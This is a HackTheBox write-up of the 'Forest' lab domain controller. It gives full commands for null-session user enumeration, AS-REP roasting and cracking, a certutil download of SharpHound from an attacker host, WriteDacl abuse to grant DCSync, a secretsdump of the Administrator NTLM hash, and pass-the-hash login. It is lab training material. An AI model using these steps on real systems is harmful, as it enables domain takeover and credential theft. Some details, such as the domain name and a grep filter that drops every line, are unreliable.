# HackTheBox: Forest — Writeup

## 📊 Executive Summary

This writeup documents the systematic security assessment and complete compromise of the **Forest** machine on HackTheBox. The attack vector initiates with an unauthenticated null session over **MSRPC**, allowing full domain user enumeration. A subsequent **AS-REP Roasting** attack against accounts with Kerberos preauthentication disabled yields a service account's hash, which is cracked offline to establish initial access via **WinRM**.

Privilege escalation is achieved by analyzing the Active Directory structure using **BloodHound**. Exploiting membership within the **Account Operators** group, the compromised service account is added to the **Exchange Windows Permissions** group. This group holds the **WriteDacl** privilege over the domain object. By modifying the discretionary access control list (DACL) of the domain, the user is granted Directory Replication (**DCSync**) rights. A DCSync attack is then executed to exfiltrate the Domain Administrator's NTLM hash, culminating in full domain compromise via a **Pass-the-Hash** attack.

---

## 🔍 1. Reconnaissance & Enumeration

### Initial Port Scanning

An aggressive TCP port scan was executed to map the target's attack surface:

```bash
nmap -Pn -n -sS -p- --min-rate 5000 --open <TARGET_IP>

```

### Targeted Service Auditing

Based on the discovered open ports, a detailed version and vulnerability script scan was performed:

```bash
nmap -sCV -p53,88,135,139,445,636,5985,47001,49664,49670,49677,49683,49698 <TARGET_IP>

```

* **Result:** The target is confirmed to be a Windows Server configured as an Active Directory Domain Controller. Notably, **WinRM (5985)** is open, offering potential for remote administrative management.

### Null Session User Enumeration (MSRPC)

Since port 135/445 is exposed, a null session connection was attempted using `rpcclient` to extract domain information without providing credentials:

```bash
rpcclient -U "" -N <TARGET_IP>

```

Once the interactive MSRPC session was established, a query was issued to retrieve all domain accounts:

```cmd
rpcclient $> enumdomusers

```

### User List Sanitization

The output of the `enumdomusers` query was copied into a file named `users.txt` and processed locally on the attacker system to build a clean target username list:

```bash
cat users.txt | cut -d ":" -f2 | awk '{print $1}' | tr -d '[,]' | grep -v -E 'SM_|Health|$' > valid_users.txt
rm users.txt

```

---

## ⚡ 2. Initial Access (AS-REP Roasting)

### Exploit No-Preauthentication Accounts

Using the sanitized username list, an **AS-REP Roasting** attack was performed using the Impacket suite. This identifies accounts that do not require Kerberos preauthentication (`DONT_REQ_PREAUTH`):

```bash
impacket-GetNPUsers -usersfile valid_users.txt active.htb/ -dc-ip <TARGET_IP>

```

* **Result:** A valid Kerberos AS-REP ticket hash was successfully retrieved for the service account **`svc-alfresco`**.

### Offline Password Cracking

The recovered hash was saved to a local file (`hash_asrep.txt`) and subjected to an offline dictionary attack using `john` and the standard `rockyou` wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash_asrep.txt

```

* **Result:** The hash was successfully cracked, revealing the cleartext credentials: **`svc-alfresco:s3rvice`**.

### Establishing an Interactive Shell (Evil-WinRM)

With valid domain credentials and WinRM exposed, an interactive PowerShell session was established on the target:

```bash
evil-winrm -i <TARGET_IP> -u svc-alfresco -p s3rvice

```

The user context was verified, and the initial user flag was exfiltrated:

```cmd
*Evil-WinRM* PS C:\> cd Users\svc-alfresco\Desktop
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt

```

---

## 🛡️ 3. Active Directory Enumeration (SharpHound)

### Transferring the Collector

To map relationships and privilege delegation paths within the Active Directory domain, the **BloodHound** ingestor (`SharpHound.exe`) was prepared.

On the attacker machine, the binary was located and staged via a temporary Python HTTP server:

```bash
locate SharpHound.exe
cp /usr/share/sharphound/SharpHound.exe .
python3 -m http.server 8000

```

From the active Evil-WinRM shell, `certutil` was utilized to download the executable to the target filesystem:

```cmd
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> certutil -f -urlcache http://<ATTACKER_IP>:8000/SharpHound.exe SharpHound.exe

```

### Collecting Active Directory Data

The collector was executed locally on the victim system to scan the Active Directory structure, outputting a consolidated `.zip` archive containing the collected data:

```cmd
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> .\SharpHound.exe

```

The resulting zip archive was downloaded to the attacker's machine using the built-in `download` command in Evil-WinRM.

---

## 🗺️ 4. BloodHound Path Analysis

On the attacker machine, the Neo4j database service was started, and the BloodHound GUI interface was initialized:

```bash
sudo neo4j console

```

The downloaded `.zip` archive was imported into BloodHound. Setting `SVC-ALFRESCO` as the starting node and targeting the `Domain Admins` group or the domain node (`active.htb`) mapped the following optimal privilege escalation path:

* Step 1: Service Accounts Group
The compromised `SVC-ALFRESCO` account is a member of the high-privilege **Service Accounts** group.


* Step 2: Account Operators Delegation
The **Service Accounts** group belongs to **Privileged IT Accounts**, which is nested inside the **Account Operators** group. This nesting grants the account the administrative right to add users to non-protected Active Directory groups.


* Step 3: Domain-Level WriteDacl
The **Exchange Windows Permissions** group holds the **WriteDacl** privilege over the root domain object (`DC=active,DC=htb`). This privilege allows members to write new Access Control Entries (ACEs) to the domain's DACL.


---

## 🚀 5. Privilege Escalation (DCSync Attack)

### Escalating Group Membership

Abusing our nested **Account Operators** permissions, the compromised `svc-alfresco` account was added directly to the **Exchange Windows Permissions** group:

```cmd
*Evil-WinRM* PS C:\> net group "Exchange Windows Permissions" svc-alfresco /add /domain

```

*(Note: It is necessary to restart the Evil-WinRM session to force Windows to regenerate the access token and apply the new group membership).*

Verify the token update:

```cmd
*Evil-WinRM* PS C:\> whoami /groups

```

### Abusing WriteDacl to Grant DCSync Rights

By leveraging the **WriteDacl** permission inherited from the Exchange group, the domain's access control list can be altered. Using the PowerSploit module `PowerView.ps1` (loaded into memory or run locally), the `svc-alfresco` account was granted Directory Replication rights (**DS-Replication-Get-Changes** and **DS-Replication-Get-Changes-All**), commonly known as **DCSync**:

```cmd
*Evil-WinRM* PS C:\> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\> Add-DomainObjectAcl -TargetIdentity "DC=active,DC=htb" -PrincipalIdentity "svc-alfresco" -Rights DCSync

```

### Executing the DCSync Attack (Credential Dumping)

With DCSync permissions actively bound to the account, a Domain Controller replication request was simulated from the attacker machine using Impacket's `secretsdump`. This allows the remote exfiltration of database hashes directly from the Active Directory NTDS database without code execution on the Domain Controller:

```bash
impacket-secretsdump active.htb/svc-alfresco:s3rvice@<TARGET_IP> -just-dc-user Administrator

```

* **Result:** The Domain Controller successfully replicated the target secrets, returning the Domain Administrator's NTLM hash:
```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e65a6e342ba4da46743b201a:::

```



---

## 🎯 6. Domain Compromise (Pass-the-Hash)

Using the exfiltrated NTLM hash, a **Pass-the-Hash (PtH)** login was performed via WinRM, granting an interactive administrative shell without requiring password decryption:

```bash
evil-winrm -i <TARGET_IP> -u Administrator -H 32693b11e65a6e342ba4da46743b201a

```

The session administrative context was verified, and the final root flag was read:

```cmd
*Evil-WinRM* PS C:\> whoami
# Result: active\administrator

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt

```

Full domain compromise of **Forest** is successfully accomplished.

---

*Disclaimer: This writeup is intended for educational purposes and authorized penetration testing scenarios only.*

---

---


### 🎯 Learning Objectives & Techniques Covered:

* **Directory Information Disclosure:** Leveraging unauthenticated null sessions over **MSRPC** (`rpcclient`) to map user directories.
* **Kerberos Vulnerabilities:** Performing **AS-REP Roasting** to obtain cracked user credentials from accounts lacking Kerberos preauthentication.
* **Access Control List (ACL) Abuse:** Identifying and exploiting **WriteDacl** permissions over the root domain object to grant targeted accounts Directory Replication privileges.
* **DCSync Exploitation:** Executing replication attacks to exfiltrate critical domain hashes directly from the Directory Service database.
